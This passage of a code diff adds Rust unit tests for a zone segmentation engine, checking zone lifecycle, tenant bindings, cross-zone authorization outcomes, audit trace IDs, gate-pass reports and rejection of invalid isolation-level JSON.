+        assert_eq!(engine.resource_zone_map.len(), resource_count);
+
+        // Test random access patterns (simulates real workload)
+        for i in (0..100).step_by(7) { // Non-sequential access pattern
+            let zone_idx = (i * 17) % zone_count; // Random-like distribution
+            let zone_id = format!("stress-zone-{:06}", zone_idx);
+
+            assert!(engine.get_zone(&zone_id).is_some());
+
+            let tenant_idx = (i * 23) % tenant_count;
+            let tenant_id = format!("stress-tenant-{:06}", tenant_idx);
+            assert!(engine.get_tenant_binding(&tenant_id).is_some());
+        }
+    }
+
+    #[test]
+    fn negative_rapid_zone_lifecycle_operations_state_consistency() {
+        let mut engine = ZoneSegmentationEngine::new();
+
+        // Simulate rapid create/delete cycles to test state consistency
+        for cycle in 0..100 {
+            let zone_id = format!("cycle-zone-{}", cycle);
+
+            // Create zone with dependencies
+            engine.register_zone(ZonePolicy::new(&zone_id, 80, 5, IsolationLevel::Strict)).unwrap();
+
+            let tenant_id = format!("cycle-tenant-{}", cycle);
+            engine.bind_tenant(TenantBinding::new(&tenant_id, &zone_id, "read", 1)).unwrap();
+
+            let resource_id = format!("cycle-resource-{}", cycle);
+            engine.register_resource(&resource_id, &zone_id);
+
+            let key_id = format!("cycle-key-{}", cycle);
+            engine.bind_key_to_zone(&key_id, &zone_id);
+
+            // Verify creation
+            assert!(engine.get_zone(&zone_id).is_some());
+            assert!(engine.get_tenant_binding(&tenant_id).is_some());
+            assert_eq!(engine.resolve_zone(&resource_id).unwrap(), zone_id);
+            assert!(engine.is_key_bound_to_zone(&key_id, &zone_id));
+
+            // Immediately delete if cycle is even
+            if cycle % 2 == 0 {
+                engine.delete_zone(&zone_id).unwrap();
+
+                // Verify cascade deletion
+                assert!(engine.get_zone(&zone_id).is_none());
+                assert!(engine.get_tenant_binding(&tenant_id).is_none());
+                assert!(engine.resolve_zone(&resource_id).is_err());
+                assert!(!engine.is_key_bound_to_zone(&key_id, &zone_id));
+            }
+        }
+
+        // Final state should have only odd cycles remaining
+        assert_eq!(engine.list_zones().len(), 50); // 100 cycles, 50 odd ones remain
+    }
+
+    #[test]
+    fn negative_cross_zone_authorization_sequence_and_timing_attacks() {
+        let mut engine = ZoneSegmentationEngine::new();
+
+        // Setup zones with complex authorization matrix
+        let mut zone_a = ZonePolicy::new("zone-a", 90, 5, IsolationLevel::Strict);
+        zone_a.allow_cross_zone("zone-b");
+        engine.register_zone(zone_a).unwrap();
+
+        let mut zone_b = ZonePolicy::new("zone-b", 80, 3, IsolationLevel::Custom);
+        zone_b.allow_cross_zone("zone-c");
+        engine.register_zone(zone_b).unwrap();
+
+        let zone_c = ZonePolicy::new("zone-c", 70, 2, IsolationLevel::Permissive);
+        engine.register_zone(zone_c).unwrap();
+
+        // Test authorization sequence consistency under rapid requests
+        let auth_scenarios = vec![
+            ("zone-a", "zone-b", "valid-proof-ab", true),   // Should succeed
+            ("zone-b", "zone-c", "valid-proof-bc", true),   // Should succeed
+            ("zone-c", "zone-a", "valid-proof-ca", true),   // Permissive allows any with proof
+            ("zone-a", "zone-c", "invalid-proof-ac", false), // A doesn't allow C directly
+            ("zone-b", "zone-a", "invalid-proof-ba", false), // B doesn't allow A
+        ];
+
+        // Rapidly execute authorization attempts
+        for (i, (source, target, proof, should_succeed)) in auth_scenarios.iter().enumerate() {
+            let req = CrossZoneRequest::new(
+                *source,
+                *target,
+                format!("action-{}", i),
+                format!("user-{}", i),
+                *proof
+            );
+
+            let result = engine.authorize_cross_zone(&req);
+
+            if *should_succeed {
+                assert!(result.is_ok(),
+                       "Authorization from {} to {} should succeed with proof {}",
+                       source, target, proof);
+            } else {
+                assert!(result.is_err(),
+                       "Authorization from {} to {} should fail with proof {}",
+                       source, target, proof);
+            }
+        }
+
+        // Verify event consistency after rapid authorization attempts
+        let authorized_count = engine.event_count(ZTS_003_CROSS_ZONE_AUTHORIZED);
+        let violation_count = engine.event_count(ZTS_004_ISOLATION_VIOLATION);
+
+        assert_eq!(authorized_count, 3); // 3 successful authorizations
+        assert_eq!(violation_count, 2);  // 2 violations
+    }
+
+    #[test]
+    fn negative_push_bounded_edge_cases_with_complex_data_types() {
+        // Test push_bounded with various edge cases and data type scenarios
+
+        // Test with capacity exactly matching initial size
+        let mut items = vec!["a", "b", "c"];
+        push_bounded(&mut items, "d", 3);
+        assert_eq!(items, vec!["b", "c", "d"]); // First item evicted
+
+        // Test with capacity smaller than initial size
+        let mut items = vec![1, 2, 3, 4, 5];
+        push_bounded(&mut items, 6, 2);
+        assert_eq!(items, vec![5, 6]); // Multiple items evicted
+
+        // Test with very large capacity
+        let mut items = vec!["test"];
+        push_bounded(&mut items, "new", usize::MAX);
+        assert_eq!(items, vec!["test", "new"]); // No eviction
+
+        // Test with complex data structures
+        let mut complex_items: Vec<BTreeMap<String, u32>> = Vec::new();
+        for i in 0..5 {
+            let mut map = BTreeMap::new();
+            map.insert(format!("key-{}", i), i);
+            complex_items.push(map);
+        }
+
+        let mut new_map = BTreeMap::new();
+        new_map.insert("new-key".to_string(), 999);
+        push_bounded(&mut complex_items, new_map, 3);
+
+        assert_eq!(complex_items.len(), 3);
+        assert!(complex_items[2].contains_key("new-key"));
+    }
+
+    #[test]
+    fn negative_zone_audit_event_trace_id_generation_and_ordering() {
+        let mut engine = ZoneSegmentationEngine::new();
+
+        // Generate many events to test trace ID generation
+        for i in 0..100 {
+            let zone_id = format!("trace-zone-{}", i);
+            engine.register_zone(ZonePolicy::new(&zone_id, 80, 5, IsolationLevel::Strict)).unwrap();
+        }
+
+        let events = engine.events();
+        assert_eq!(events.len(), 100);
+
+        // Verify trace ID format and uniqueness
+        let mut trace_ids = std::collections::BTreeSet::new();
+        for (i, event) in events.iter().enumerate() {
+            // Trace IDs should follow format "trace-{index}"
+            assert_eq!(event.trace_id, format!("trace-{}", i));
+            assert_eq!(event.code, ZTS_001_ZONE_REGISTERED);
+            assert!(trace_ids.insert(event.trace_id.clone())); // Should be unique
+        }
+
+        // Test event draining and trace ID continuation
+        let drained_events = engine.take_events();
+        assert_eq!(drained_events.len(), 100);
+        assert!(engine.events().is_empty());
+
+        // Next event should continue trace ID sequence
+        engine.register_zone(ZonePolicy::new("continuation-zone", 80, 5, IsolationLevel::Strict)).unwrap();
+        let new_events = engine.events();
+        assert_eq!(new_events.len(), 1);
+        assert_eq!(new_events[0].trace_id, "trace-100"); // Continues sequence
+    }
+
+    #[test]
+    fn negative_gate_pass_logic_with_various_engine_states() {
+        // Test gate pass logic under various engine state conditions
+
+        // Empty engine should fail gate pass
+        let empty_engine = ZoneSegmentationEngine::new();
+        assert!(!empty_engine.gate_pass());
+        let empty_report = empty_engine.to_report();
+        assert_eq!(empty_report["gate_verdict"], "FAIL");
+
+        // Engine with zones should pass
+        let mut normal_engine = ZoneSegmentationEngine::new();
+        normal_engine.register_zone(ZonePolicy::new("test-zone", 80, 5, IsolationLevel::Strict)).unwrap();
+        assert!(normal_engine.gate_pass());
+        let normal_report = normal_engine.to_report();
+        assert_eq!(normal_report["gate_verdict"], "PASS");
+
+        // Engine with zones but many violations (current implementation still passes)
+        let mut violation_engine = ZoneSegmentationEngine::new();
+        violation_engine.register_zone(ZonePolicy::new("violation-zone", 80, 5, IsolationLevel::Strict)).unwrap();
+
+        // Generate many isolation violations
+        for i in 0..50 {
+            let req = CrossZoneRequest::new(
+                "violation-zone",
+                "nonexistent-zone",
+                format!("bad-action-{}", i),
+                "attacker",
+                "fake-proof"
+            );
+            let _ = violation_engine.authorize_cross_zone(&req); // Will fail
+        }
+
+        assert_eq!(violation_engine.event_count(ZTS_004_ISOLATION_VIOLATION), 50);
+        // Current implementation: gate_pass only checks if zones exist, not violations
+        assert!(violation_engine.gate_pass());
+        let violation_report = violation_engine.to_report();
+        assert_eq!(violation_report["gate_verdict"], "PASS");
+        assert_eq!(violation_report["isolation_violations_detected"], 50);
+
+        // Engine with zones deleted should fail again
+        let mut deleted_engine = ZoneSegmentationEngine::new();
+        deleted_engine.register_zone(ZonePolicy::new("temp-zone", 80, 5, IsolationLevel::Strict)).unwrap();
+        assert!(deleted_engine.gate_pass());
+
+        deleted_engine.delete_zone("temp-zone").unwrap();
+        assert!(!deleted_engine.gate_pass());
+        let deleted_report = deleted_engine.to_report();
+        assert_eq!(deleted_report["gate_verdict"], "FAIL");
+    }
+
+    #[test]
+    fn negative_error_propagation_chains_through_complex_operations() {
+        let mut engine = ZoneSegmentationEngine::new();
+
+        // Test error propagation through complex operation chains
+
+        // Attempt to bind tenant to nonexistent zone - should fail early
+        let tenant_bind_result = engine.bind_tenant(
+            TenantBinding::new("orphan-tenant", "nonexistent-zone", "read", 5)
+        );
+        assert_eq!(tenant_bind_result, Err(SegmentationError::ZoneNotFound));
+        assert!(engine.get_tenant_binding("orphan-tenant").is_none());
+
+        // Create zone, bind tenant, then attempt operations that should fail
+        engine.register_zone(ZonePolicy::new("temp-zone", 80, 5, IsolationLevel::Strict)).unwrap();
+        engine.bind_tenant(TenantBinding::new("valid-tenant", "temp-zone", "read", 5)).unwrap();
+
+        // Disable freshness and attempt delete - should preserve all state
+        engine.set_freshness_valid(false);
+        let delete_result = engine.delete_zone("temp-zone");
+        assert_eq!(delete_result, Err(SegmentationError::FreshnessStale));
+
+        // State should be preserved after failed delete
+        assert!(engine.get_zone("temp-zone").is_some());
+        assert!(engine.get_tenant_binding("valid-tenant").is_some());
+
+        // Cross-zone operations should still work on existing zone
+        engine.set_freshness_valid(true);
+        let same_zone_result = engine.validate_zone_action(
+            "temp-zone", "temp-zone", "internal-action", "user", ""
+        );
+        assert!(same_zone_result.is_ok()); // Same zone operations don't need proof
+
+        // Cross-zone to nonexistent zone should fail
+        let cross_zone_result = engine.validate_zone_action(
+            "temp-zone", "missing-zone", "cross-action", "user", "proof"
+        );
+        assert_eq!(cross_zone_result, Err(SegmentationError::ZoneNotFound));
+    }
+
+    #[test]
+    fn negative_isolation_level_serialization_with_unknown_variants() {
+        // Test that serde properly handles isolation level edge cases
+
+        // Valid serialization should work
+        for level in [IsolationLevel::Strict, IsolationLevel::Permissive, IsolationLevel::Custom] {
+            let json = serde_json::to_string(&level).unwrap();
+            let deserialized: IsolationLevel = serde_json::from_str(&json).unwrap();
+            assert_eq!(level, deserialized);
+        }
+
+        // Test deserialization of invalid variants should fail
+        let invalid_variants = vec![
+            "\"unknown_level\"",
+            "\"STRICT\"",  // Wrong case
+            "\"strict \"", // Trailing space
+            "\" strict\"", // Leading space
+            "\"permissive_mode\"", // Wrong variant name
+            "\"custom_rules\"",    // Wrong variant name
+            "null",
+            "42",
+            "[]",
+            "{}",
+        ];
+
+        for invalid in invalid_variants {
+            let result: Result<IsolationLevel, _> = serde_json::from_str(invalid);
+            assert!(result.is_err(),
+                   "Invalid isolation level '{}' should fail deserialization", invalid);
+        }
     }
 }
